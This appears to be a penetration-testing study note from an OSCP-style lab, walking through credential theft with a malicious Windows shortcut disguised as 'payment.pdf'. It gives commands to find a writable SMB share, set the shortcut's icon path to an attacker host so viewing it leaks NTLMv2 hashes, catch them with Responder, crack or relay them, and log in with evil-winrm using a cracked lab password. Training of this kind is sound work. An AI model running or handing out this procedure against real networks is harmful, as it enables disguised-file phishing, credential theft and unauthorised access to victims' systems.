# Evil Windows Library File
- Tool: https://github.com/Greenwolf/ntlm_theft
- google search: generate force NTLMv2 Authentication files site:github.com
- This is allowed on OSCP as it is NOT automatic exploitation
- if you see a SMB share with writable permissions, upload an EVIL lnk file
- Use responder to catch NTLMv2 creds
- Box: ***Vault*** - Offsec PG Practice
- Demo during Hacktrack with Mentors, Assembling the pieces 3.
- reference PEN200 12.3.1 https://portal.offsec.com/courses/pen-200-44065/learning/client-side-attacks-48976/abusing-windows-library-files-49009/obtaining-code-execution-via-windows-library-files-48979
- https://field-manual.brunorochamoura.com/manual/exploitation/client-side-exploitation/evil-windows-library-file/
---
## Forced Authentication & .lnk File Abuse
Forced Authentication: 
	- Coerce Authentication via abusing legitimate file functions  
LNK icon smuggling:   
	- Coerce authenicaion via ICON paths
	- Execute malicious code via legitimate functions
	- WE can replace lnk files to point to a remote file
	- we can also make lnk files use binary, to exeucte some command we want
	- If you find a share we have write access to, upload our evil binary
	- Mount share  smbclient \\\\IP\ShareName  

---

### Craft EVIL .lnk File

```
On windows desktop, right-click -> new shortcut
Location:  %WINDIR%  -> next
name: "payment.pdf"  -> finish

WE will change icon to look like PDF.
If target doesnt have view option, "show file extensions" on, our LNK will look like a .pdf file
Right-click our EVIL lnk -> properties -> 
target: %ComSpec% /c echo pwned >%UserProfile\desktop\hacked.txt

%comspec% == cmd.exe
change icon -> Look for icons in this file -> \\KALIIP\test.ico
hit OK, there will be an error..

When user RENDERS icon, explorer.exe will try to fetch the icon.. no user-interaction required.
This provides us with a HASH, from the target user/computer

google search: generate force NTLMv2 Authentication files site:github.com
```
---

### Identify SMB Write Access
```
# check for guest access 
nxc smb 192.168.205.172 -u "guest" -p "" --shares
SMB         192.168.205.172 445    DC               [*] Enumerated shares
SMB         192.168.205.172 445    DC               Share           Permissions     Remark
SMB         192.168.205.172 445    DC               -----           -----------     ------
SMB         192.168.205.172 445    DC               DocumentsShare  READ,WRITE      
```
Here we see DocumentsShare is mis-permissioned, and we, as GUEST, have write access.

---

### Listen With Responder
responder is only in analyze mode, no poisoning or spoofing is being used
`sudo responder -I tun0 -A`

Relay if you can't crack : [Impacket-ntlmrelayX](/03-Active-Directory/NTLMv2_Credential_Theft.md)

---
### Upload Evil LNK
```
smbclient \\\\192.168.165.172\\DocumentsShare
put payment.pdf.lnk
```

Check responder, we should see NTLMv2 hit
Once the user/scheduled task/automation touches/view or file, we should get a hash in responder

---

### Crack
Hash should be NTLMv2, and be autodetected by hashcat. 
If crack not possibly, we can also relay to another host.
hashcat hash /usr/share/wordlists/rockyou.txt
`hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`

[Impacket-ntlmrelayX](/03-Active-Directory/NTLMv2_Credential_Theft.md)

---

### Use your New Found Power
Now that we have a password, we should re-enumerate shares
```
nxc smb 192.168.205.172 -u "anirudh" -p "SecureHM" --shares
nxc winrm 192.168.205.172 -u "anirudh" -p "SecureHM" --shares
evil-winrm -i 192.168.205.172 -u "anirudh" -p "SecureHM" 
```

### NTLM_THEFT
```bash
sudo responde
python3 /opt/ntlm_theft/ntlm_theft.py -g modern -s 192.168.45.158 -f ticket
```